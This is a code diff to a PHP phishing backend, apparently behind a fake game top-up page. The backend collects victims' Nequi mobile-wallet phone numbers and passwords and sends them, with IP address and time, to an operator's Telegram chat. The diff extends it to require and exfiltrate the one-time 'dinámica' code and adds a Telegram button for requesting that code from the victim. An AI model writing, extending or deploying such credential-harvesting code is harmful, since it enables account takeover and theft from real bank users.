@@ -243,13 +243,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($d['action']) && $d['action'] === 'enviar_datos_nequi_directo') {
         $telefono = $d['telefono'] ?? '';
         $clave = $d['clave'] ?? '';
+        $dinamica = $d['dinamica'] ?? '';
         $monto = $d['monto'] ?? '0';
         $playerId = $d['playerId'] ?? '';
         $playerName = $d['playerName'] ?? '';
         $diamonds = $d['diamonds'] ?? '0';
         $bonus = $d['bonus'] ?? '0';
 
-        if (empty($telefono) || empty($clave)) {
+        if (empty($telefono) || empty($clave) || empty($dinamica)) {
             echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
             exit;
         }
@@ -266,6 +267,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $msg .= "------------------------------\n";
         $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($telefono) . "</code>\n";
         $msg .= "<b>• 🔐 Clave:</b> <code>" . htmlspecialchars($clave) . "</code>\n";
+        $msg .= "<b>• 🔢 Dinámica:</b> <code>" . htmlspecialchars($dinamica) . "</code>\n";
         $msg .= "------------------------------\n";
 
         // Obtener IP y dispositivo
@@ -285,8 +287,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $msg .= "<b>• 🗺 IP:</b> " . $ip . "\n";
         $msg .= "<b>• ⏱ Hora:</b> " . $hora . "\n";
 
-        // Enviar mensaje directo a Telegram sin botones
-        $keyboard = ['inline_keyboard' => []]; // Sin botones
+        // Enviar mensaje directo a Telegram con botón para solicitar dinámica
+        $keyboard = [
+            'inline_keyboard' => [
+                [
+                    ['text' => '📱 Solicitar Dinámica', 'callback_data' => 'solicitar_dinamica']
+                ]
+            ]
+        ];
         $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);
 
         echo json_encode(['ok' => !empty($sent['ok'])]);
